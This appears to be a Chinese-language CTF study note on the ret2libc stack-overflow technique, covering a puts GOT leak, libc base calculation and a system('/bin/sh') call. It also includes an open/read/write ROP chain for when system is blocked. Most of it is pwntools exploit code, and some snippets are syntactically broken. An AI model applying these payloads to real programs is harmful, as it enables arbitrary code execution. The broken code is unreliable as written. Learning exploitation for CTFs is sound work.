其实，我们的 `ret2libc` 的过程，就是一个在我们的大量数据中，找到一个有用数据的过程。
而因为我们的操作系统是默认开启了 ASLR 防护的，因此我们内存中的 `share libraries` 段的地址是随机的，
## 找函数地址
如果我们想要通过我们的栈溢出漏洞去执行一个函数，我们可以通过下面的方法来进行

### 直接劫持
方法一：对于我们之前**有过一次执行**的函数，我们把我们的程序执行流劫持到我们的 `system@plt`）：
这一种方法类似于我们的 `ret2shellcode`，但是相比较之下，所需要的条件更少。
此时，我们可以构造出我们的 payload 如下所示：
```
payload=system@plt+垃圾数据+system@plt的地址
```

另外，如果我们采用了我们的 `ret2libc`，那么我们也可以仿照我们的 `ROp` 链一样，同时执行多个我们需要的函数，只需要按照下面的方式构造：
```
payload=func1+pop_ret+func1地址+fuc2+pop_ret+func2地址+fuc2+pop_ret+func3地址
```

### 间接获取
如果我们的函数完全没有任何的出现，我们仍然可以通过下面的方法来获取到我们的真实函数的地址。
![[Pasted image 20240116182500.png]]
第一步：获取我们的 `libc` 文件的版本，这一步我们可以通过我们的库函数来实现
```python
elf=ELF('./babyof')
```

第二步：获得我们的 libc 文件的基地址。这一步，我们的思路是：通过我们已知的 `puts` 函数来打印自己在 libc 文件中的文件中的地址，然后我们把这个数据接受下来，之后我们再一次调用我们的原函数。具体的 payload 如下所示如下所示：
这里，我们就有：
```python
payload=垃圾数据+puts函数的plt地址+main函数的地址+puts函数的got地址
```
其中，我们的第一个 puts 函数是我们要执行的函数，而他的参数就是我们的第三个变量，`puts` 函数的 got 地址。而我们的 `main` 函数的地址就是告诉我们我们还要再执行一遍我们的函数。

```python
payload_1 = b'M'*(0xE7+4) + p32(puts_plt) + p32(main_addr) + p32(puts_got) r.sendline(payload_1) r.recvline() 
puts_addr = u32(r.recv(4)) 
print("puts_addr: " + hex(puts_addr))
```
64 位情况下的方法 (主意栈平衡）：
```python
payload_1=b"a"*offset + p64(pop_rdi) + p64(xx@got) + p64(xx@plt) + p64(ret_addr)
```


第三步：查找相应函数的偏移量，这里，我们可以使用我们的相关函数如下所示：
```python
base_addr = puts_addr - libc.symbols['puts'] system_addr = base_addr + libc.symbols['system'] bin_sh_addr = base_addr + next(libc.search(b'/bin/sh')) print("system_addr: " + hex(system_addr)) print("bin_sh_addr: " + hex(bin_sh_addr))
```

第四步：我们根据我们得到的偏移函数，来找到我们的对应的 payload
```cpp
payload_2 = b'M'*(0xE7+4) + p32(system_addr) + b'M'*4 +p32(bin_sh_addr) 
r.sendline(payload_2)
r.interactive()
```
64 位位下的方法：
```
payload_2=b'M'*offset+p64(ret)p64(pop_edi)+p64(/bin/sh)
```

## 限制了 system 调用
这一个和我们的唯一的区别在于我们的最后一步 payload 的构造。
```python
payload=b'a'*0x10
payload+=p64(rdi)+p64(0)+p64(rsi)+p64(flag)+p64(rdx_r12)+p64(8)*2+p64(read);
# 把我们的flag写进buf
payload+=p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(rdx_r12)+p64(0)*2+p64(open_)
# 打开我们的flag
payload+=p64(rdi)+p64(3)+p64(rsi)+p64(buf)+p64(rdx_r12)+p64(0x30)*2+p64(read)
# 读取我们的文件
payload+=p64(rdi)+p64(1)+p64(write)
# 写我们的文件
```